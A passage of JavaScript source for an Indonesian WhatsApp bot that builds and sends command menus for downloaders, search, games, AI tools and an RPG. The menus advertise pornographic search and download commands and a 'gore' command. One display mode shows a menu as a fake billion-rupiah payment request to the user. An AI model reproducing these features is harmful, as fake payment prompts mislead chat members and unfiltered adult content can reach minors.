${global.tTeks}moewalls *query / link*
${global.tTeks}mediafire *link*
${global.tTeks}pinterest *query*
${global.tTeks}pinterest2 *query*
${global.tTeks}pixabay *query*
${global.tTeks}playmods *query*
${global.tTeks}playmodsdl *link*
${global.tTeks}play *query*
${global.tTeks}play2 *query*
${global.tTeks}playstore *query*
${global.tTeks}playstoredl *link*
${global.tTeks}pinterestdl *link*
${global.tTeks}pinvideo *link*
${global.tTeks}pixiv *query*
${global.tTeks}pixeldrain *link*
${global.tTeks}ringtone *query*
${global.tTeks}rexdl *link*
${global.tTeks}sfile *query*
${global.tTeks}sfiledl *link*
${global.tTeks}sfiledl2 *link*
${global.tTeks}sharechat *link*
${global.tTeks}song *query*
${global.tTeks}soundcloudsearch *query*
${global.tTeks}soundcloud *link*
${global.tTeks}soundcloud2 *link*
${global.tTeks}spotify *link*
${global.tTeks}spotify2 *link*
${global.tTeks}spotifylist *link*
${global.tTeks}spotifysearch *query*
${global.tTeks}spotifysearch2 *query*
${global.tTeks}stickersearch *query*
${global.tTeks}snackvideo *link*
${global.tTeks}savetik *link*
${global.tTeks}snaptik *link*
${global.tTeks}tiktokaudio *link*
${global.tTeks}tt *link*
${global.tTeks}tiktokvideo *link*
${global.tTeks}tiktok2 *link*
${global.tTeks}tiktok3 *link*
${global.tTeks}tiktokslide *link*
${global.tTeks}threads *link*
${global.tTeks}threads2 *link*
${global.tTeks}threadsimg *link*
${global.tTeks}terabox *link*
${global.tTeks}telestick *link*
${global.tTeks}twitdl *link*
${global.tTeks}twitter *link*
${global.tTeks}twitter2 *link*
${global.tTeks}unsplash *query*
${global.tTeks}unsplash2 *query*
${global.tTeks}video *query*
${global.tTeks}wattpad *link*
${global.tTeks}wattpadsearch *query*
${global.tTeks}xnxxsearch *query*
${global.tTeks}xnxxsearch2 *query*
${global.tTeks}xnxxsearch3 *query*
${global.tTeks}xnxxdl *link*
${global.tTeks}xnxxdl2 *link*
${global.tTeks}xvideosearch *query*
${global.tTeks}xvideodl *link*
${global.tTeks}youtube *link*
${global.tTeks}ytvn *link*
${global.tTeks}ytmp3 *link*
${global.tTeks}ytmp3v2 *link*
${global.tTeks}ytmp4 *link*
${global.tTeks}ytmp4v2 *link*
${global.tTeks}ytplay *link*
${global.tTeks}ytsearch *link*
${global.tTeks}zippy *link*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'searchmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *S E A R C H - M E N U*
${simboltengah}
${global.tTeks}9apps *query*
${global.tTeks}apksearch *query*
${global.tTeks}apkmirorsearch *query*
${global.tTeks}bukalapak *query*
${global.tTeks}beasiswa
${global.tTeks}covid *query*
${global.tTeks}drakor *query*
${global.tTeks}dafont *query*
${global.tTeks}dafontsearch *query*
${global.tTeks}dafontdl *link*
${global.tTeks}duckduckgo *query*
${global.tTeks}domainsearch *query*
${global.tTeks}event
${global.tTeks}goglereverse *reply Image*
${global.tTeks}gore
${global.tTeks}gsmarena *query/link*
${global.tTeks}harilibur *query*
${global.tTeks}jobstreet *query*
${global.tTeks}lk21 *query*
${global.tTeks}lk21now
${global.tTeks}linesticksearch *query*
${global.tTeks}music *query*
${global.tTeks}mahasiswa *query*
${global.tTeks}nekopoi *link*
${global.tTeks}nekopoisearch *query*
${global.tTeks}nhentaipdf *kode*
${global.tTeks}nhentaiget *kode*
${global.tTeks}nhentaisearch *query*
${global.tTeks}nhentainew
${global.tTeks}pornhub *query/link*
${global.tTeks}randompornhub
${global.tTeks}randompornhub2
${global.tTeks}stackoverflow *query*
${global.tTeks}steam *query*
${global.tTeks}searchbokepindo *query*
${global.tTeks}streambokepindo *link*
${global.tTeks}searchplace *query*
${global.tTeks}songfinder *query/token*
${global.tTeks}telesticksearch *query*
${global.tTeks}tiktoksearch *query*
${global.tTeks}tiktoksearch2 *query*
${global.tTeks}trendtwit *country*
${global.tTeks}trendyt *country*
${global.tTeks}trendgoogle *country*
${global.tTeks}urbandic *query*
${global.tTeks}whatmusic *reply audio/video*
${global.tTeks}wallpaper
${global.tTeks}webtoon *query*
${global.tTeks}xhamster *query/link*
${global.tTeks}xhamsterdetail *link*
${global.tTeks}yandexreverse *reply Image*
${global.tTeks}ytplaylist *url*
${global.tTeks}zerochan *query*
${simbolbawah}
${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'gamemenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *G A M E - M E N U*
${simboltengah}
${global.tTeks}modegame
${global.tTeks}werewolf
${global.tTeks}casino
${global.tTeks}sᴜɪᴛ *ᴍᴇɴᴛɪᴏɴ ᴏʀ ʀᴇᴘʟʏ*
${global.tTeks}ᴛɪᴄᴛᴀᴄᴛᴏᴇ *ᴍᴇɴᴛɪᴏɴ ᴏʀ ʀᴇᴘʟʏ*
${global.tTeks}ᴅᴇʟᴛᴛᴛ
${global.tTeks}dare
${global.tTeks}ᴘᴇᴛᴀᴋʙᴏᴍ
${global.tTeks}ᴅᴇʟᴘᴇᴛᴀᴋʙᴏᴍ
${global.tTeks}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
${global.tTeks}ᴛᴇʙᴀᴋᴀɴɪᴍᴇ
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀʙᴜᴘᴀᴛᴇɴ
${global.tTeks}ᴛᴇʙᴀᴋʟᴀɢᴜ
${global.tTeks}ᴋᴜɪs
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
${global.tTeks}ᴛᴇʙᴀᴋʟɪʀɪᴋ
${global.tTeks}ᴛᴇʙᴀᴋᴋɪᴍɪᴀ
${global.tTeks}ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
${global.tTeks}dare
${global.tTeks}sᴜsᴜɴᴋᴀᴛᴀ
${global.tTeks}slot
${global.tTeks}ᴀsᴀʜᴏᴛᴀᴋ
${global.tTeks}sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
${global.tTeks}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
${global.tTeks}ᴍᴀᴛʜ ᴍᴏᴅᴇ
${global.tTeks}ғᴀᴍɪʟʏ100
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'aimenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
$${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *A I - M E N U*
${simboltengah}
${global.tTeks}3dmodel-ai *prompt*
${global.tTeks}3dr *prompt*
${global.tTeks}ask *query*
${global.tTeks}aimage *query*
${global.tTeks}animediff *prompt*
${global.tTeks}animeart *prompt*
${global.tTeks}aiscene *reply*
${global.tTeks}ai-img *query*
${global.tTeks}ai-real *prompt*
${global.tTeks}ai-pixel *prompt*
${global.tTeks}ai-gemini *query*
${global.tTeks}aiphotolabs *query*
${global.tTeks}aiv2 *query*
${global.tTeks}aivoice *query*
${global.tTeks}anything *prompt*
${global.tTeks}b.ai *query*
${global.tTeks}bard *query*
${global.tTeks}bard2 *question*
${global.tTeks}bardimg *reply*
${global.tTeks}bing *query*
${global.tTeks}bing2 *query*
${global.tTeks}bingimg *query*
${global.tTeks}bingimg2 *query*
${global.tTeks}bingimg-2d *prompt*
${global.tTeks}bingimage *query*
${global.tTeks}blackbox *query*
${global.tTeks}blackboximg *reply|query*
${global.tTeks}c.ai *query*
${global.tTeks}cartoonme *reply*
${global.tTeks}chatgpt *query*
${global.tTeks}chatgptimg *reply|query*
${global.tTeks}claude-ai *query*
${global.tTeks}createimg *prompt*
${global.tTeks}colorize *reply Img*
${global.tTeks}dalle *prompt*
${global.tTeks}dehaze *reply Img*
${global.tTeks}degreeguru *query*
${global.tTeks}differentme *query*
${global.tTeks}differentme2 *query*
${global.tTeks}disney *prompt*
${global.tTeks}diffusion *prompt*
${global.tTeks}diffusion2 *prompt*
${global.tTeks}enc *query*
${global.tTeks}enhance *image*
${global.tTeks}esrgan *reply*
${global.tTeks}emi *prompt*
${global.tTeks}gemini *query*
${global.tTeks}gemini-img *reply Image*
${global.tTeks}gimage *query*
${global.tTeks}gimage2 *query*
${global.tTeks}greyscale *reply*
${global.tTeks}gambar *query*
${global.tTeks}google *query*
${global.tTeks}google-ai *query*
${global.tTeks}gptpicture *query*
${global.tTeks}gptpicture2 *query*
${global.tTeks}gptweb *query*
${global.tTeks}hdv2 *reply img*
${global.tTeks}hd *reply img*
${global.tTeks}hdvid *reply vid*
${global.tTeks}hercai *query*
${global.tTeks}hercai-img *prompt*
${global.tTeks}img2pixel *reply img*
${global.tTeks}jadigta *reply img*
${global.tTeks}kayy *query*
${global.tTeks}kayychat *enable / disable*
${global.tTeks}lirik *query*
${global.tTeks}lyrics *query*
${global.tTeks}lexicart *query*
${global.tTeks}llama *query*
${global.tTeks}lumin-ai *query*
${global.tTeks}leolm-ai *query*
${global.tTeks}mangadiff *prompt*
${global.tTeks}midjourny *query*
${global.tTeks}midjourny2 *prompt*
${global.tTeks}mixtral-ai *query*
${global.tTeks}mistral-ai *query*
${global.tTeks}naw *query*
${global.tTeks}openai/ai *query*
${global.tTeks}palm-ai *query*
${global.tTeks}prompt *reply Img*
${global.tTeks}promptgen *prompt*
${global.tTeks}prodia *prompt*
${global.tTeks}phi3-ai *query*
${global.tTeks}pixelate *reply Image*
${global.tTeks}pixelart *prompt*
${global.tTeks}pixart *model|prompt*
${global.tTeks}photoleap *prompt*
${global.tTeks}ragbot-ai *query*
${global.tTeks}runphp *query*
${global.tTeks}readrecipe *link*
${global.tTeks}recipe *query*
${global.tTeks}realistic *prompt*
${global.tTeks}realistic2 *prompt*
${global.tTeks}recolor *reply Img*
${global.tTeks}recognize *reply img*
${global.tTeks}removebg *reply img*
${global.tTeks}removebg2 *reply*
${global.tTeks}remini *reply img*
${global.tTeks}remini2 *reply|scala*
${global.tTeks}stablediff *query*
${global.tTeks}stablediff2 *prompt*
${global.tTeks}sindy-ai *query*
${global.tTeks}stability-ai *prompt*
${global.tTeks}seaart *prompt*
${global.tTeks}sooks-ai *text detector*
${global.tTeks}simi *query*
${global.tTeks}simichat *enable / disable*
${global.tTeks}simivoice *query*
${global.tTeks}smartcontract *query*
${global.tTeks}tinyurl *link*
${global.tTeks}tozombie *reply img*
${global.tTeks}toanime *reply img*
${global.tTeks}toanime2 *reply*
${global.tTeks}text2img *prompt*
${global.tTeks}text2img2 *prompt*
${global.tTeks}text2video *prompt*
${global.tTeks}turnme *reply*
${global.tTeks}upscale *image*
${global.tTeks}2img *query*
${global.tTeks}2img2 *query*
${global.tTeks}waifudiff *prompt*
${global.tTeks}whatanime *reply*
${global.tTeks}wasted *reply Image*
${global.tTeks}wanted *reply Image*
${global.tTeks}whisper *reply audio*
${global.tTeks}you.ai *qeury*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'rpgmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *R P G - M E N U*
${simboltengah}
${global.tTeks}me
${global.tTeks}inventory
${global.tTeks}mining
${global.tTeks}buy
${global.tTeks}sell
${global.tTeks}heal
${global.tTeks}hunt
${global.tTeks}adventure
${global.tTeks}luckyday
${global.tTeks}killslime
${global.tTeks}killgoblin
${global.tTeks}killdevil
${global.tTeks}killbehemoth
${global.tTeks}killdemon
${global.tTeks}killdemonking
${global.tTeks}joinrpg
${global.tTeks}sellikan
${global.tTeks}sellbesi
${global.tTeks}sellemas
${global.tTeks}jelajah
${global.tTeks}mancing
${global.tTeks}jualikan
${global.tTeks}jualcoal
${global.tTeks}jualstone
${global.tTeks}jualingot
${global.tTeks}jualkayu
${global.tTeks}jualbahankimia
${global.tTeks}lebur
${global.tTeks}nebang
${global.tTeks}goplanet
${global.tTeks}ojek
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
